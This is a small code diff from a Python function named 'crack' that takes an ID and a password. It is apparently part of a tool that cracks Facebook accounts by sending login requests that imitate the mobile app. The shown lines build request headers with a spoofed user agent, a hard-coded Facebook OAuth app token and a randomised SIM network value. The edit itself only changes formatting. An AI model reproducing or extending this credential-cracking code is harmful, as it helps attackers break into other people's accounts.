@@ -492,8 +492,7 @@ def crack(idf,pwv):
             "client_country_code": "GB",
             "currently_logged_in_userid": "0",
         }
-            header_freefb = {
-            "User-Agent": ua,
+            header_freefb = {"User-Agent": ua,
             "Content-Type": "application/x-www-form-urlencoded",
             "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
             "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
